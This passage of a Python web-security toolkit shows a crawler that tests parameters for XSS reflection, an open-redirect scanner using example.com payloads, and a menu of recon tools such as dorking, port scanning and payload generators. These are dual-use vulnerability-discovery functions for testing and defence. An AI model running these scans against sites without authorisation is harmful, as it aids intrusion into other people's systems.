    print(CYAN + "\n[+] Crawling...\n" + RESET)

    queue = [(start_url, 0)]

    while queue:
        u, l = queue.pop(0)
        queue.extend(crawl(u, l))


    print(GREEN + f"[✓] Parameters discovered: {len(parameters)}\n" + RESET)


    # ------------------------------
    # threaded tests
    # ------------------------------
    print(CYAN + "[+] Testing reflections...\n" + RESET)

    with ThreadPoolExecutor(max_workers=threads) as exe:
        for u, m, p in parameters:
            exe.submit(test_param, u, m, p)


    # ------------------------------
    # save report
    # ------------------------------
    with open("vluxgen_xss_report.txt", "w") as f:
        for r in results:
            f.write(r + "\n")

    print(GREEN + f"\n[✓] Scan finished | Reflections: {len(results)}" + RESET)
    print(GREEN + "[✓] Saved → vluxgen_xss_report.txt\n" + RESET)



# -----------------------------------------------------
# MAIN
# -----------------------------------------------------
def xss_pro_framework():

    start = input("Target URL: ").strip()
    depth = int(input("Depth (default 2): ") or 2)

    visited = set()
    params = []
    reflections = []


    # -----------------------------
    # FAST ASYNC CRAWLER
    # -----------------------------
    async def crawler():

        domain = urlparse(start).netloc
        queue = [start]

        async with aiohttp.ClientSession() as session:

            while queue:
                batch = queue[:20]
                queue = queue[20:]

                tasks = [fetch(session, u) for u in batch]
                pages = await asyncio.gather(*tasks)

                for url, html in zip(batch, pages):

                    if not html:
                        continue

                    visited.add(url)

                    soup = BeautifulSoup(html, "html.parser")

                    parsed = urlparse(url)

                    # GET params
                    for p in parse_qs(parsed.query):
                        params.append((url, "GET", p))

                    # FORMS
                    for form in soup.find_all("form"):
                        action = urljoin(url, form.get("action", ""))
                        method = form.get("method", "GET").upper()

                        for inp in form.find_all("input"):
                            name = inp.get("name")
                            if name:
                                params.append((action, method, name))

                    # JS endpoint mining
                    for script in soup.find_all("script", src=True):
                        print("[JS]", script["src"])

                    # LINKS
                    for a in soup.find_all("a", href=True):
                        link = urljoin(url, a["href"])

                        if domain in link and link not in visited:
                            queue.append(link)


    # -----------------------------
    # CONTEXT ANALYSIS
    # -----------------------------
    def context_detect(body, mark):

        if f'"{mark}"' in body or f"'{mark}'" in body:
            return "Attribute Context", "MEDIUM"

        if f"<{mark}" in body:
            return "Tag Context", "HIGH"

        if mark in body:
            return "Plain Reflection", "LOW"

        return None, None


    # -----------------------------
    # REFLECTION TEST
    # -----------------------------
    async def test_params():

        async with aiohttp.ClientSession() as session:

            for url, method, param in params:

                mark = random_marker()

                try:
                    if method == "GET":
                        test_url = f"{url}?{param}={mark}"
                        async with session.get(test_url) as r:
                            body = await r.text()
                    else:
                        async with session.post(url, data={param: mark}) as r:
                            body = await r.text()

                    if mark in body:
                        ctx, sev = context_detect(body, mark)
                        reflections.append((url, param, ctx, sev))
                        print(f"[REFLECTED] {url} | {param} | {ctx} | {sev}")

                except:
                    pass


    # -----------------------------
    # RUN
    # -----------------------------
    print("\n[+] Crawling...")
    asyncio.run(crawler())

    print(f"[+] Params found: {len(params)}")

    print("[+] Testing reflections...")
    asyncio.run(test_params())


    # -----------------------------
    # HTML REPORT (PRO)
    # -----------------------------
    with open("xss_report.html", "w") as f:

        f.write("<h1>VLUXGEN XSS Report</h1><table border=1>")
        f.write("<tr><th>URL</th><th>Param</th><th>Context</th><th>Severity</th></tr>")

        for r in reflections:
            f.write(f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>")

        f.write("</table>")

    print("\n[✓] HTML report saved → xss_report.html\n")


# =====================================================
# 🔥 VLUXGEN MASTER OPEN REDIRECT SCANNER (PRO)
# Professional Redirect Misconfiguration Detection
# =====================================================

import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
import threading


def open_redirect_master():

    print(MAGENTA + "\n[ VLUXGEN MASTER OPEN REDIRECT SCANNER ]\n" + RESET)

    start_url = input("Target URL: ").strip()
    depth = int(input("Depth (default 2): ") or 2)
    threads = int(input("Threads (default 30): ") or 30)

    session = requests.Session()

    domain = urlparse(start_url).netloc
    visited = set()
    params = []
    findings = []
    lock = threading.Lock()

    # --------------------------------------
    # Common redirect-like parameter names
    # --------------------------------------
    redirect_keywords = [
        "next", "url", "redirect", "redir",
        "return", "returnto", "goto",
        "dest", "destination", "continue"
    ]

    # safe payloads
    payloads = [
        "https://example.com",
        "//example.com",
        "/\\example.com",
    ]


    # --------------------------------------
    # CRAWLER + PARAM MINER
    # --------------------------------------
    def crawl(url, level):

        if level > depth or url in visited:
            return []

        visited.add(url)

        links = []

        try:
            r = session.get(url, timeout=5)
            soup = BeautifulSoup(r.text, "html.parser")

            parsed = urlparse(url)

            # existing GET params
            for p in parse_qs(parsed.query):
                if any(k in p.lower() for k in redirect_keywords):
                    params.append((url, p))

            # forms
            for form in soup.find_all("form"):
                action = urljoin(url, form.get("action", ""))

                for inp in form.find_all("input"):
                    name = inp.get("name")
                    if name and any(k in name.lower() for k in redirect_keywords):
                        params.append((action, name))

                links.append(action)

            # links
            for a in soup.find_all("a", href=True):
                link = urljoin(url, a["href"])
                if domain in link:
                    links.append(link)

        except:
            pass

        return [(l, level+1) for l in links]


    # --------------------------------------
    # REDIRECT DETECTION ENGINE
    # --------------------------------------
    def test_redirect(url, param):

        for payload in payloads:

            try:
                parsed = urlparse(url)
                query = parse_qs(parsed.query)
                query[param] = payload

                new_query = urlencode(query, doseq=True)

                test_url = parsed._replace(query=new_query).geturl()

                r = session.get(test_url, allow_redirects=False, timeout=5)

                vulnerable = False

                # 1 header redirect
                if "Location" in r.headers:
                    if "example.com" in r.headers["Location"]:
                        vulnerable = True

                # 2 meta refresh
                if re.search(r'url=.*example\.com', r.text, re.I):
                    vulnerable = True

                # 3 javascript redirect
                if "location.href" in r.text and "example.com" in r.text:
                    vulnerable = True

                if vulnerable:
                    with lock:
                        print(RED + f"[OPEN REDIRECT] {url} → param: {param}" + RESET)
                        findings.append((url, param))
                    return

            except:
                pass


    # --------------------------------------
    # START CRAWL
    # --------------------------------------
    print(CYAN + "\n[+] Crawling...\n" + RESET)

    queue = [(start_url, 0)]

    while queue:
        u, lvl = queue.pop(0)
        queue.extend(crawl(u, lvl))

    print(GREEN + f"[✓] Potential redirect params found: {len(params)}\n" + RESET)


    # --------------------------------------
    # THREAD SCAN
    # --------------------------------------
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for u, p in params:
            exe.submit(test_redirect, u, p)


    # --------------------------------------
    # HTML REPORT
    # --------------------------------------
    with open("vluxgen_redirect_report.html", "w") as f:

        f.write("<h1>VLUXGEN Open Redirect Report</h1><table border=1>")
        f.write("<tr><th>URL</th><th>Parameter</th></tr>")

        for u, p in findings:
            f.write(f"<tr><td>{u}</td><td>{p}</td></tr>")

        f.write("</table>")


    print(GREEN + "\n[✓] Scan complete" + RESET)
    print(GREEN + "[✓] Report saved → vluxgen_redirect_report.html\n" + RESET)


 # =====================================================
# MAIN MENU
# =====================================================
def menu():
    while True:
        print(CYAN + """   
              

              
┌─────────────────────────────┐
│ 1 → Wordlist Generator      │
│ 2 → Website Crawler         │
│ 3 → Parameter Finder        │
│ 4 → Google Dork Helper      │
│ 5 → XSS Payload Generator   │
│ 6 → SQLI Payload Generator  │
| 7 → Subdomain Finder        |
| 8 → WAF Detector            |
| 9 → Port Scanner            | 
| 10 →Security Header Auditor |
| 11 → Master XSS Analyzer    |  
| 12 → Open Redirect Scanner  |
│ 0 → Exit                    │
└─────────────────────────────┘
""" + RESET)

        choice = input("vluxgen > ")

        if choice == "1":
            wordlist_generator()
        elif choice == "2":
            crawler()
        elif choice == "3":
            parameter_finder()
        elif choice == "4":
            google_dork()
        elif choice == "5":
            safe_xss_test()
        elif choice == "6":
            safe_sqli_test()
        elif choice == "7":
            subdomain_finder()
        elif choice == "8":
            waf_detector()
        elif choice == "9":
             port_scanner()
        elif choice == "10":
            header_auditor()
        elif choice == "11":
         xss_master_scanner()
        elif choice == "12":
          open_redirect_master()
        elif choice == "0":
            sys.exit()
        else:
            print("Invalid option\n")


# =====================================================
# RUN
# =====================================================
if __name__ == "__main__":
    try:
        banner()
        menu()
    except KeyboardInterrupt:
        print("\n\n[!] Ctrl+C pressed — GOOD BYEE💗...\n")
        sys.exit(0)
